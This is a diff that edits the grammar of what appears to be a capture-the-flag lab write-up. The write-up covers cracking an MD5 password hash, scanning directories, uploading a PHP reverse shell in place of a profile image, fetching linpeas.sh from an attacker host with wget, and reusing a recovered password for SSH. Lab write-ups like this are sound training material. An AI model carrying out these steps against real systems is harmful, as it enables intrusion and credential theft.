@@ -34,10 +34,10 @@ We can always adapt it to our needs.
 So, we got student registration number and password hash
 
 Cracking hash I got: cd73502828457d15655bbd7a63fb0bc8:student (I've used hashes.com) 
-for the cracking we can used the commandline
-Find the hash: hash-identifier cd73502828457d15655bbd7a63fb0bc8  
-(The hash is md5). Save this hash into a file 
-Now use hashcrack: hashcrack -m 0 hash.txt path/to/wordlist
+for the cracking we can use the commandline
+Find the hash: hash-identifier cd73502828457d15655bbd7a63fb0bc8  (I came to know that this hash is MD5)
+(The hash is md5). Save this hash into a file. I save it as hash.txt.
+Now use hashcrack: hashcrack -m 0 hash.txt path/to/wordlist  (Note: In hashcrack the 0 is the mode for MD5)
 - hashcrack -m <mode for hash> <hash file that need to be cracked> <wordlist>
 
 Now, to know the exact location of the login page for students. I performed a gobuster directory scan. For more details look into the gobuster.txt.
@@ -50,20 +50,20 @@ Other tools:
 Successfully logged inn
 ```
 Now, after successful login I've observed there's a my-profile page where we can upload an image. (But instead of image I uploaded an php reverse shell).
-Note: before uploading the php reverse shell open an netcat listener.
+Note: before uploading the php reverse shell open a netcat listener.
 
 Now, after the successful reverse shell. I thought of privilege escalation but we have limited access.
 
 So, I executed "linpeas.sh"
 
-I downloaded linpeas and opened an python3 http.server
+I downloaded linpeas and opened a python3 http.server
 - Command: wget http://<attacker Ip>:<port>/linpeas.sh
 
 After, executing linpeas.sh I found an user name "grimmie" and his password "My_V3ryS3cur3_P4ss".
 
 Performed ssh : ssh grimmie@<target ip> 
 
-Found a box backup.sh
+Found a file backup.sh
 Info: while performing linpeas.sh I didn't find any cronjobs in the machine.
 
 So, in order to check any automated files running on the system I downloaded pspy64 tool. This tools helps to monitor all the processes which are running on the system without root access.
